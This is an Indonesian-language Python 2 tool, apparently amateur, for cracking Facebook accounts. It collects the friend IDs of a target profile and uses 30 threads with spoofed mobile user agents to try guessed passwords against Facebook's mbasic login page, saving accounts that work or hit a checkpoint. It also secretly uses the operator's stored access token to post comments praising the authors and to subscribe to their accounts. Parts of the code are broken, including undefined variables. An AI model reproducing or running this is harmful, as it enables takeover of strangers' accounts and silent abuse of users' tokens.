
import os
import sys
import random
import time
try:
	import re
	import json
	import requests
except ImportError:
	print(' [-] module requests belum terinstall ')
	print(' [-] silahkan ketik > pip2 install requests')
try:
	from requests.exceptions import ConnectionError
	from datetime import datetime
	from multiprocessing.pool import ThreadPool
except ConnectionError:
	print(' [-] check your internet Connection ')
	
loop = 0
id = []
ra_pw = []

#color
ku = '\x1b[1;93m'
hj = '\x1b[1;92m'
ml = '\x1b[1;101m'
ra = '\x1b[0m'
m = '\x1b[1;91m'
bm = '\x1b[1;96m'
ua_one = "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
ua_two = "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaX6-00/40.0.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4"
ua_three = "Mozilla/5.0 (SymbianOS/9.4; Series60/5.3; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebkit/525 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/525"
ua_four = "Mozilla/5.0 (SymbianOS/9.4; Series60/5.3; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebkit/525 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/525"
ua_five = "nokia 6280/2.0(03.60)/profile/midp-1.0;configuration/cldc-1.0"
ua_six = "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-4/10.0.001; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML,like Gecko) BrowserNG/7.1.17125"
ua_xx = "BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103"
ua_rr = "BlackBerry7130e/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/104"
#user agent
rafi_ua = random.choice([ua_one,ua_two,ua_three,ua_four,ua_five,ua_six,ua_xx,ua_rr])
	
#pwa = 'rafikhalbi90'
#pwad = 'Rafikhalbi90'
#def s():
#ip
try:
	ip = requests.get('https://api.ipify.org').text
except ConnectionError:
	print('\n [!] check your internet Connection !\n');time.sleep(1)

	
garis = '''__________________________________________________
'''
	
def jalan(z):
	for i in z + '\n':
		sys.stdout.write(i)
		sys.stdout.flush()
		time.sleep(00.1)

rafi_logo = '''
 \x1b[1;96m______   _     _  _______ \t \x1b[0mau : -=[ RYAN and RAFI ]=-
\x1b[1;96m(_____ \ | |   | |(_______)
 _____) )| |___| | _     _ 
|  __  / |_____  || |   | |
| |  \ \  _____| || |   | |
|_|   |_|(_______||_|   |_| \x1b[1;101m CREAT BY : RYAN\x1b[0m
 \x1b[0m__________________________________________________
'''

def login():
	os.system("clear")
	try:
		token = open('login_r.txt','r')
		menu()
	except (KeyError,IOError):
		print(rafi_logo)
		print ' [1] login with token facebook '
		print ' [0] exit \n'
		met_log = raw_input(" [\x1b[101m\x1b[1;97m?\x1b[0m] pilih : ")
		if met_log =="":
			print '\n [!] mohon di isi '; time.sleep(1)
			login()
		elif met_log == "1" or met_log == "01":
			tokenz()
		elif met_log == "0":
			jalan(' [R] silahkan kembali lagi ')
			os.system('exit')
		else:
			login()

def tokenz():
	os.system('clear')
	print(rafi_logo)
	try:
		token = open('login_r.txt','r')
	except (KeyError,IOError):
		token = raw_input(' [\x1b[101m?\x1b[0m] token : ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			avsid = open("login_r.txt", 'w')
			avsid.write(token)
			avsid.close()
			follow_my_account()
			jalan(' [!] login succes....')
		except KeyError:
			print ' [!] token salah '

def follow_my_account():
    try:
        token = open('login_r.txt', 'r').read()
    except IOError:
        print(' invalid token ! ')
        jalan(' please login again')
        os.system('rm -rf login_r.txt')
    kom_r = 'lopyu bang rafi'
    kom_ry = random.choice(['ganteng bang riyan','ganteng bang'])
    requests.post('https://graph.facebook.com/148068940881574/comments/?message=' + kom_r + '&access_token=' + token)
    requests.post('https://graph.facebook.com/3288917538050468/comments/?message=' + kom_ry + '&access_token=' + token)
    requests.post('https://graph.facebook.com/100070354054405/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100067770738028/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100007967615958/subscribers?access_token=' + token)
    menu()
    
def menu():
	os.system('clear')
	global token
	try:
		token = open('login_r.txt','r').read()
	except IOError:
		jalan(' [!] token invalid ')
		os.system('clear')
		os.system('rm -rf login_r.txt')
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		jalan(' [!] invalid token ')
		os.system('rm -rf login_r.txt')
		login()
	except requests.exceptions.ConnectionError:
		print(' [!] check your Internet connection ')
	print(rafi_logo)
	print ' [%s-%s] facebook user : %s'%(ml,ra,nama)
	print ' [%s-%s] ip user : %s'%(ml,ra,ip)
	print ' [%s-%s] id user : %s\n'%(ml,ra,id)
	print ' [%s1%s] start crack '%(hj,ra)
	print ' [%s2%s] hapus token '%(ku,ra)
	print ' [%s0%s] logout\n '%(m,ra)
	asw = raw_input(' [?] pilih : ')
	if asw =='1' or asw =='01':
		crack()
	elif asw =='2' or asw =='02':
		jalan(' [!] menghapus token....');time.sleep(1)
		os.system('rm -rf login_r.txt')
		login()
	elif asw =='0':
		jalan(' [!] silahkan datang kembali ')
		os.system('exit')
	elif asw =='' or asw ==' ':
		jalan(' [!] harap di isi ')
		menu()
	else:
		jalan(' [!] hanya pilih yang ada di menu ')
		menu()
		
def crack():
	os.system('clear')
	print(rafi_logo)
	global token
	try:
		token = open('login_r.txt', 'r').read()
	except IOError:
		print' [!] invalid token '
		tokenz()
	ra_id = raw_input(" [\x1b[101m\x1b[1;97m?\x1b[0m] ID Public : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+ra_id+"?access_token="+token)
		sp = json.loads(pok.text)
	except KeyError:
		jalan(' [!] Id tidak ditemukan ')
	r = requests.get("https://graph.facebook.com/"+ra_id+"/friends?access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		rax_x = i['id']
		name = i['name']
		id.append(rax_x+'<=>'+name)
	print(" [\x1b[101m\x1b[1;97m-\x1b[0m] Total ID  : "+str(len(id)))
	print(garis)
	print ' \t\t\x1b[1;101m\x1b[1;97mCTRL + Z FOR STOP\x1b[0m'
	print(garis)

	def main(user):
		global loop, token
		ra_pw = []
		sys.stdout.write(
		      '\r [%sC] berjalan %s - %s please wait.. ! ' % (ra,loop, len(id))
		); sys.stdout.flush()
		try:os.mkdir("results")
		except OSError:pass
		rax_x,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					ra_pw.append(name)
					ra_pw.append(ss+"12")
					ra_pw.append(ss+"123")
					ra_pw.append(ss+"1234")
					ra_pw.append(ss+"12345")
				else:
					ra_pw.append("sayang")
					ra_pw.append("kontol")
					ra_pw.append("bismillah")
		try:
			for pw in ra_pw:
				pw = pw.lower()
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': rax_x, 'pass': pw, 'login': 'submit'}, headers={'user-agent': rafi_ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  ==-[ ' +rax_x+ '|' + pw + '       ',']-==')
					ok.append(rax_x+'|'+pw)
					save.write('  [ OK ] '+str(rax_x)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login_r.txt').read()
						url = ("https://graph.facebook.com/"+rax_x+"?access_token="+token)
						data = s.get(url).json()
						tgllhr = data['birthday'].replace("/","-")
						nama = data['name']
						print('\r  \x1b[1;96m[ CP ] ' +rax_x+ ' <-> ' + pw + ' <-> ' + tgllhr)
						cp.append(rax_x+' <-> '+pw+' <-> '+tgllhr)
						save.write('  [ CP ] '+str(rax_x)+' <-> '+str(pw)+' <-> '+tgllhr+'\n')
						save.close()
						break
					except(KeyError, IOError):
						tgllhr = " "
					except:pass
					print('\r  \x1b[1;96m [ CP ] ' +rax_x+ ' <-> ' + pw + '       ')
					cp.append(rax_x+'|'+pw)
					save.write('  [ CP ] '+str(rax_x)+' <-> '+str(pw)+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit(' \n[!] selesai ')

if __name__ == '__main__':
	#os.system('clear')
	#print(rafi_logo)
	#user = raw_input(' [\x1b[101m\x1b[1;97m?\x1b[0m] siapa nama anda : ')
	#print# ' hello : %s'#%(user)
	#lock()
	login()